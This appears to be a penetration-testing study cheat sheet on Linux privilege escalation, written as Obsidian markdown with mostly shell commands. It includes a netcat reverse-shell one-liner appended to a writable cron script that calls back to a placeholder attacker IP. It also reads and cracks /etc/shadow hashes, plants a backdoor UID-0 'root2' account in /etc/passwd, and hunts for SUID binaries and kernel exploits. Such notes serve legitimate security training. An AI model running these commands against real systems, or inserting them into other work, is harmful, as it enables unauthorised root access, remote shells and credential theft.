
| [[08 Linux Privilege Escalation#Abusing Cron Jobs\|Abusing Cron Jobs]] | [[08 Linux Privilege Escalation#Abusing Setuid Binaries\|Abusing Setuid Binaries]] | [[08 Linux Privilege Escalation#Exploiting Kernel Vulnerabilities\|Exploiting Kernel Vulnerabilities]] |
| ------------------------------------------------------------------- | ------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------- |
## Abusing Cron Jobs
```shell
# Inspect cron log file
kali@kali:~$ grep "CRON" /var/log/syslog

# Inspect permissions for vulnerable scripts found
kali@kali:~$ ls -lah /home/joe/.scripts/user_backups.sh

# If writable, add reverse shell one-liner
kali@kali:~$ echo "rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_IP> <PORT> >/tmp/f" >> user_backups.sh
```

## Abusing Password Authentication
```shell
# View passwords stored in /etc/shadow
kali@kali:~$ cat /etc/shadow

# If can crack, just crack
kali@kali:~$ sudo hashcat -m 500 hashes.shadow /usr/share/wordlists/rockyou.txt --force
# Hash format => $1$... after the first colon delimiter

# If /etc/passwd is writable, it takes precedence

# Generate password hash using crypt
kali@kali:~$ openssl passwd w00t

# Add entry to /etc/passwd
kali@kali:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

# Escalate to root2 (new superuser)
kali@kali:~$ su root2 # enter password "w00t" when prompted
```
## Abusing Setuid Binaries
```shell
# Inspect real UID and eUID assigned to processes
kali@kali:~$ grep Uid /proc/<PID>/status

# Look for SUID files
kali@kali:~$ find / -perm -u=s -type f 2>/dev/null

# Assign SUID flag (runs as file's owner)
kali@kali:~$ chmod u+s <FILE>

# Enumerate for binaries with capabilities
kali@kali:~$ /usr/sbin/getcap -r / 2>/dev/null
kali@kali:~$ sudo -l

# Refer to GTFOBins to exploit these
# https://gtfobins.github.io/
# App-Armor might block check with
kali@kali:~$ aa-status
```

## Exploiting Kernel Vulnerabilities
```shell
# System info cmds (covered in Inital Entry Point)
kali@kali:~$ cat /etc/issue
kali@kali:~$ uname -r
kali@kali:~$ arch

# Searchsploit to find exploits
kali@kali:~$ searchsploit "linux kernel ubuntu 16 local privilege escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"

# Compile exploits on target machine if possible

# Inspect Linux ELF file architecture
kali@kali:~$ file cve-2017-16995
```
## Additional Notes:
- Look at services run by root, are they vulnerable to RCE?
- Search for plaintext/hashed credentials within the filesystem